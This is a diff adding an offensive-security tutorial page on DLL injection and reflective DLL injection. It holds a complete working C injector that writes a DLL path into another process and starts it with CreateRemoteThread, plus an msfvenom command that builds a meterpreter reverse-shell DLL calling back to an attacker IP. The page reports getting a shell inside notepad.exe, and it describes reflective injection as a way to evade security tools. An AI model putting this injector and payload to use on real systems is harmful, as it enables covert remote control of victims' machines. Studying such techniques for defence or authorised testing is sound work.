@@ -1,0 +1,83 @@
+### DLL Injection
+#### What is DLL Injection ?
+- It allows users to run any code in the memory of another process by forcing the process to load a foreign DLL file. 
+- The process involves attaching to a process, allocating memory, copying the DLL into the process's memory, and create a thread in the target process to execute our injected DLL.
+#### DLL Injection Example
+Creating the Injector
+```c copy filename="injector.cpp"
+#include <Windows.h>
+#include <cstdio>
+
+int main(int argc, char* argv[]) {
+	HANDLE processHandle;
+	PVOID remoteBuffer;
+	wchar_t dllPath[] = TEXT("C:\\users\\victim\\desktop\\shell.dll");
+
+	printf("Injecting DLL to PID: %i\n", atoi(argv[1]));
+	processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
+	remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof dllPath, MEM_COMMIT, PAGE_READWRITE);
+	WriteProcessMemory(processHandle, remoteBuffer, (LPVOID)dllPath, sizeof dllPath, NULL);
+	PTHREAD_START_ROUTINE threatStartRoutineAddress = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryW");
+	CreateRemoteThread(processHandle, NULL, 0, threatStartRoutineAddress, remoteBuffer, 0, NULL);
+	CloseHandle(processHandle);
+
+	return 0;
+}
+```
+Create our DLL payload to be injected in the target process using **msfvenom**
+```bash copy filename="Bash"
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.0.132 LPORT=8080 -f dll -o shell.dll
+```
+
+Now, run the injector executable against the target process using  its **PID** 
+```powershell copy filename="Powershell"
+.\injector.exe 7660
+```
+and notice that we have the reverse shell
+![meterpreter shell](/images/meterpreter-shell.png)
+
+We can notice within process hacker that  the `rundll32.exe` has been invoked to execute our injected dll under the **notepad.exe** process
+![dll injection](/images/dll-injection.png)
+
+And we can notice our `shell.dll` loaded in the **notepad.exe** process 
+![dll injection](/images/dll-injection-1.png)
+
+### RDI (Reflective DLL Injection)
+#### What is RDI ?
+- Is a more advanced form of DLL injection that aims to make the injection process less detectable by security tools and antimalware solutions. In reflective DLL injection, the injected DLL contains code that is designed to be position-independent, meaning it can execute regardless of where it's loaded in memory.
+- **Here's how reflective DLL injection works**:
+
+	- The attacker prepares a DLL that includes a small piece of code called a "loader." This loader is responsible for reading the rest of the DLL from a specific data structure in memory.
+	- The loader code is injected into the target process using a method like CreateRemoteThread,  SetWindowsHookEx or a tiny bootstrap shellcode.
+	- Once the loader code is executed in the target process, it locates the full DLL image within its own memory space and loads it into memory.
+	- The DLL's entry point is then executed, and the malicious or custom code contained within the DLL can run.
+	- Reflective DLL injection can make it harder for security tools to detect the injected DLL because the injected code does not rely on any external dependencies or traditional API calls that are typically monitored.
+#### quick dive into RDI code
+[**Stephen Fewer**](https://twitter.com/stephenfewer) explains his technique in depth in the [**Original RDI project**](https://github.com/stephenfewer/ReflectiveDLLInjection). And we'll have a quick look on what It does ..
+
+- At first we have our **injector** which will open a handle to the remote target proess.
+
+	![rdi-1](/images/rdi-1.png)
+
+	which if we don't supply the **PID** of the target process and the DLL file to be injected, will use the current **PID** as the target process and will inject the test DLL into it.
+
+	![rdi-5](/images/rdi-5.png)
+- And here we have a custom `GetProcAddress` to avoid using the native one.
+
+	![rdi-2](/images/rdi-2.png)
+
+- Here we have our reflective loader
+
+	![rdi-3](/images/rdi-3.png)
+
+- And finally we have a test DLL  that will be executed in case we didn't supply a DLL to inject
+
+	![rdi-4](/images/rdi-4.png)
+
+	
+#### RDI Example
+
+### References
+- https://www.ired.team/offensive-security/code-injection-process-injection/dll-injection
+- https://www.ired.team/offensive-security/code-injection-process-injection/reflective-dll-injection
+- https://github.com/stephenfewer/ReflectiveDLLInjection
